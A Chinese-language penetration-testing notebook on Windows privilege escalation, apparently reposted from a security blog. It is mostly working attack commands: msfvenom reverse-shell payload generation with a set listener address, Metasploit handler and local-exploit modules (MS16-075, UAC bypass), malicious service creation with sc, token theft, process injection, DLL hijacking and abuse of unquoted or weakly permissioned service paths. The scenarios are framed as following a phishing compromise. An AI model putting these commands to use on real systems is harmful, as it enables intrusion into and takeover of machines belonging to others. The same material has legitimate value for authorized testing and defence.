---
title: "Windows提权"
date: 2024-06-06
description: "1. 在本地cmd执行systeminfo > 1.txt"
tags: []
categories: ["${folder}"]
---

**人工提权**
--------

1. 在本地cmd执行systeminfo > 1.txt

2. 用脚本筛选可能漏洞

python wes.py systeminfo.txt --color

python wes.py systeminfo.txt --color -i "Elevation of Privilege"

3. 针对提供漏洞找提权脚本

KernelHub 针对常用溢出编号指定找EXP

Poc-in-Github 针对年份及编号指定找EXP

exploitdb 针对类型及关键说明指定找EXP

Exploit-DB 使用小结

searchsploit -u    更新数据库

searchsploit -h 查看帮助信息

1. 基本搜索：

查找特定词的漏洞：

searchsploit afd windows local

2. 标题搜索 -t

默认情况下，searchsploit将检查漏洞的标题以及路径。根据不同的搜索条件，这可能会弹出误报。可以使用 `-t` 选项将搜索限制为标题：

searchsploit \-t oracle windows

https://github.com/Ascotbe/Kernelhub

https://github.com/nomi-sec/PoC-in-GitHub

https://gitlab.com/exploit-database/exploitdb

**msf使用**
---------

1. 生成反弹后门

msfvenom -p windows/meterpreter/reverse\_tcp LHOST=192.168.139.141 LPORT=3333 -f exe -o msf.exe

2. 配置监听会话

use exploit/multi/handler

set payload windows/meterpreter/reverse\_tcp

set lhost 0.0.0.0

set lport 3333

exploit

2. 筛选EXP模块

全自动：快速识别系统中可能被利用的漏洞

use post/multi/recon/local\_exploit\_suggester

set showdescription true

3. 利用EXP溢出提权

background

use exploit/windows/local/ms16\_075\_reflection\_juicy

set session 1

exploit

**CS使用**
--------

./teamserver IP password

1. 连接CS

2. 创建监听器

3. 加载脚本插件

**土豆提权原理（MS16-075）**
--------------------

土豆系列提权的核心是NTLM中继，通过欺骗运行在高权限（Administrator/SYSTEM）的账户进行ntlm认证，同时作为中间人对认证过程进行劫持和重放，最后调用本地认证接口使用高权限账号的ntml认证获取一个高权限token，只要当前进程拥有SeImpersonatePrivilege权限即可进行令牌模仿，即可取得对应权限。

烂土豆(Rotten Potato) MS16-075 提权是一个本地提权，只针对本地用户，不支持域用户。

  欺骗 “NT AUTHORITY\\SYSTEM”账户通过NTLM认证到我们控制的TCP终端，对这个认证过程使用中间人攻击（NTLM重放），为“NT AUTHORITY\\SYSTEM”账户本地协商一个安全令牌。这个过程是通过一系列的Windows API调用实现的，模仿这个令牌。只有具有“模仿安全令牌权限”的账户才能去模仿别人的令牌。一般大多数的服务型账户（IIS、MSSQL等）有这个权限，大多数用户级的账户没有这个权限。

#### **适用版本**

  Windows 7/8/10，Windows server 2008/2012

**Windows钓鱼提权**

应用场景：

1. 常规某个机器被钓鱼后门攻击后，我们需要做更高权限操作或权限维持等。

2. 内网域中某个机器被钓鱼后门攻击后，我们需要对后续内网域做安全测试。

**SC命令服务启动提权**
--------------

### **前言**

早期用at命令，但是现在不常用了，适用版本：`Win2000 & Win2003 & XP`中还是存在的，在`Win7`以后被剔除，所以本文不做研究

### **原理**

SC命令提权原理主要涉及Windows系统中的服务控制命令（Service Control Command）的利用。具体来说，SC命令是用于与服务控制管理器（Service Control Manager）和服务进行通信的命令行程序，它提供了类似于控制面板中管理工具项中的服务的功能。

在提权过程中，攻击者可能会使用SC命令以高权限运行的方式创建一个恶意的服务。这个服务可以在系统启动时以系统权限运行，从而实现权限提升。这是因为系统服务通常具有比普通用户更高的权限级别，可以执行一些需要高权限的操作。

### **过程及命令**

sc是用于与服务控制管理器和服务进行通信的命令行程序。

适用版本：windows 7/10/08/12/16/19/22，早期用at命令

1. 创建一个名叫syscmd的执行文件服务

sc Create syscmd binPath= "c:\\msf.exe"

2. 运行服务

sc start syscmd

**psexec.exe远程控制（提权）**
----------------------

psexec.exe是Windows自带的程序不会被查杀

### **原理**

1.  服务控制管理器（SCM）：SCM是Windows系统中负责管理服务的组件，它允许用户启动、停止、暂停、恢复或查询服务的状态。服务是在Windows操作系统中以后台进程方式运行的应用程序，这些进程不需要用户交互，通常用于执行系统任务。
    
2.  PsExec工具：PsExec是Sysinternals Suite中的一个工具，它允许用户在本地或远程计算机上执行命令。当PsExec在远程计算机上执行命令时，它首先会在远程计算机上安装一个名为PsExecSvc.exe的服务程序。这个服务程序允许PsExec在远程计算机上执行命令。
    
3.  提权过程：
    

*   PsExec利用SCM启动一个新的服务，该服务的权限被设置为LocalSystem。LocalSystem是Windows系统中最高的权限级别之一，它拥有访问系统资源并执行各种操作的权限。
    
*   一旦服务被启动，PsExec就可以在该服务的上下文中启动进程。由于服务是以LocalSystem权限运行的，因此PsExec启动的进程也将拥有LocalSystem权限。这意味着PsExec可以执行需要更高权限才能完成的任务，例如访问受限制的文件或执行特权操作。
    

### **过程及命令**

https://docs.microsoft.com/zh-cn/sysinternals/downloads/pstools

psexec.exe -accepteula -s -i -d cmd #调用运行cmd

**进程注入（降权&提权）**
---------------

进程注入是一种广泛应用于恶意软件和无文件攻击中的逃避技术，这意味着可以将自定义代码运行在另一个进程的地址空间内。进程注入提高了隐蔽性，也实现了持久化。

### **场景**

在域环境的时候可从其他用户降至需要的用户，查看相应客户使用的服务

administrator到system  可以

system到普通用户  可以

普通用户到以上用户 不行

实战中先确认当前用户权限

如果是administrator管理员用户组权限可以尝试进程注入和令牌窃取

### **过程**

查看相应权限进程可以提权和降权

#### **MSF：**

ps //查看进程

migrate PID //迁移对应PID

#### **CS:**

ps //查看进程

inject PID //注入对应PID

建议直接用工具来进行进程注入，但是使用进程注入时MSF和CS会冲突，两个工具不能同时使用

**令牌窃取（降权&提权）**
---------------

### **场景**

在域环境的时候可从其他用户降至需要的用户，查看相应客户使用的服务

administrator到system  可以

system到普通用户  可以

普通用户到以上用户 不行

实战中先确认当前用户权限

如果是administrator管理员用户组权限可以尝试进程注入和令牌窃取

### **过程**

#### **MSF：**

use incognito

list\_tokens -u

impersonate\_token "NT AUTHORITY\\SYSTEM"

#### **CS:**

ps //查看进程

steal\_token PID //窃取进程令牌

spawnu PID //窃取进程令牌上线

**UACbypass提权**
---------------

UAC 是微软在 Windows Vista 以后版本引入的一种安全机制，

### **应用场景：**

1. 常规某个机器被钓鱼后门攻击后，我们需要做更高权限操作或权限维持等。

2. 内网域中某个机器被钓鱼后门攻击后，我们需要对后续内网域做安全测试。

### **UAC 实现方法（用户登陆过程）**

ACL（Access Control List）：Windows 中所有资源都有 ACL ，这个列表决定了拥有何种权限的用户/进程能够这个资源。在开启了 UAC 之后，如果用户是标准用户， Windows 会给用户分配一个标准 `Access Token`.如果用户以管理员权限登陆，会生成两份访问令牌，一份是完整的管理员访问令牌（Full Access Token），一份是标准用户令牌。一般情况下会以标准用户权限启动 Explorer.exe 进程。如果用户同意，则赋予完整管理员权限访问令牌进行操作。

### **触发UAC**

> UAC需要授权的动作包括：配置Windows Update增加或删除用户账户改变用户的账户类型改变UAC设置安装ActiveX安装或移除程序安装设备驱动程序设置家长控制将文件移动或复制到Program Files或Windows目录查看其他用户文件夹via Wiki

### **小迪笔记**

#Win10&11-BypassUAC自动提权-MSF&UACME

为了远程执行目标的exe或者bat可执行文件需要绕过此安全机制

在用户到系统权限自动提权中也学通过BypassUAC实现自动化提权

绕过项目：MSF内置，Powershell渗透框架，UACME项目(推荐)

开启UAC和未开启UAC时,CS/MSF默认getsystem提权影响(进程注入等)

msfvenom -p windows/meterpreter/reverse\_tcp lhost=xx.xx.xx.xx  lport=xx -f exe -o msf.exe

推荐直接使用win10模块，更加符合真实场景

1. MSF模块：

钓鱼用的不推荐

use exploit/windows/local/ask

win7：

use exploit/windows/local/bypassua

win10:

use exploit/windows/local/bypassuac\_sluihijack

use exploit/windows/local/bypassuac\_silentcleanup

2. UACME项目：

https://github.com/hfiref0x/UACME

Akagi64.exe 编号 调用执行

### **总结**

UAC就是getsystem失败，然后你通过UACbypass就可以进行getsysteam

推荐使用UACME项目，很是不错，一个编号不行多换几个

编号范围1-78，没反应就是没成功

**Windows-DLL劫持提权**
-------------------

简单说一下流程，就是有些进程权限很高，你就可以找到这些进程调用的dll来进行覆盖和劫持，msf可以生成dll马，要想实现dll劫持先找到进程调用的可劫持dll，不要找Windows文件下的，因为你没权限去修改dll文件，优先找exe文件下的dll，有火绒剑和一个项目ChkDllHijack可以检测都很好用

### **原理**

Windows程序启动的时候需要DLL。如果这些DLL 不存在，则可以通过在应用程序要查找的位置放置恶意DLL来提权。通常，Windows应用程序有其预定义好的搜索DLL的路径，它会根据下面的顺序进行搜索：

Windows查找DLL目录及其顺序如下:

1. 应用程序加载的目录
2. C:\\Windows\\System32
3. C:\\Windows\\System
4. C:\\Windows
5. 当前工作目录Current Working Directory，CWD
6. 在PATH环境变量的目录（先系统后用户）

这样的加载顺序很容易导致一个系统dll被劫持，因为只要攻击者将目标文件和恶意dll放在一起即可,导致恶意dll先于系统dll加载，而系统dll是非常常见的，所以当时基于这样的加载顺序，出现了大量受影响软件。

### **小迪笔记**

过程：信息收集-进程调试-制作dll并上传-替换dll-等待启动应用成功

检测：ChkDllHijack 火绒剑

项目：https://github.com/anhkgg/anhkgg-tools

利用火绒剑进行进程分析加载DLL，一般寻程序DLL利用。

msfvenom -p windows/meterpreter/reverse\_tcp lhost=xx.xx.xx.xx  lport=xx -f dll -o xiaodi.dll

提前信息收集相关软件及DLL问题程序，本地调试成功后覆盖DLL实现利用

**Windows-不带引号服务路径配合MSF-MacroExpert**
-------------------------------------

### **原理**

当系统管理员配置Windows服务时，他们必须指定要执行的命令，或者运行可执行文件的路径。

当Windows服务运行时，会发生以下两种情况之一。如果给出了可执行文件，并且引用了完整路径，则系统会按字面解释它并执行。但是，如果服务的二进制路径未包含在引号中，则操作系统将会执行找到的空格分隔的服务路径的第一个实例。

路径没有包含在引号中，服务会按照以下顺序依次执行

c:\\program.exec:\\program files.exec:\\program files (x86)\\grasssoft\\macro.exec:\\program files (x86)\\grasssoft\\macro expert\\MacroService.exe

像这种exe路径没有空格也没有带引号的路径就没有安全问题

D:\\网盘下载\\百度网盘\\BaiduNetdisk\\YunUtilityService.exe

原理总结

服务路径配置由于目录空格问题，可上传文件配合解析恶意触发执行

### **过程**

检测服务权限配置-制作文件并上传-服务路径指向解析-等待调用成功

检测命令：

wmic service get name,displayname,pathname,startmode |findstr /i "Auto" |findstr /i /v "C:\\Windows\\" |findstr /i /v """

上传反弹exe，设置好对应执行名后，执行sc start "Macro Expert"

**Win2012-不安全的服务权限配合MSF-NewServices**
-------------------------------------

这个不好用就不过多阐述

### **原理：**

Windows服务有时被配置为与服务本身或与服务运行的目录相关的弱权限。这可能允许攻击者操纵服务，以便在其启动时执行任意代码，并将权限提升到SYSTEM。

### **利用方法：**

将服务的 binpath 更改为我们上传的木马文件路径，以便在服务启动时执行恶意代码从而获得system权限。

accesschk.exe工具介绍：accesschk是一个windows系统配置检查工具，用于查看文件、注册表项、服务、进程、内核对象等的有效权限。该工具将有助于识别当前用户是否可以修改某个服务目录中的文件。

由于它是微软官方出品，我们将其上传至靶机，执行不会受到阻碍

下载地址：https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk

### **过程：**

检测服务权限配置-制作文件并上传-更改服务路径指向-调用后成功

检测脚本：

accesschk.exe -uwcqv "" \*

sc config "test" binpath= "C:\\Program.exe"

sc start test

**小迪推荐项目**
----------

综合类检测项目：

https://github.com/carlospolop/PEASS-ng

PEAS-ng适用于Windows和Linux/Unix\*和MacOS的权限提升工具。

winPEAS.bat > result.txt

winPEASany.exe log=result.txt


原文转自：[水刃安全](https://mp.weixin.qq.com/s/IvfcBpKWEvDA-j_TGa2oHQ)
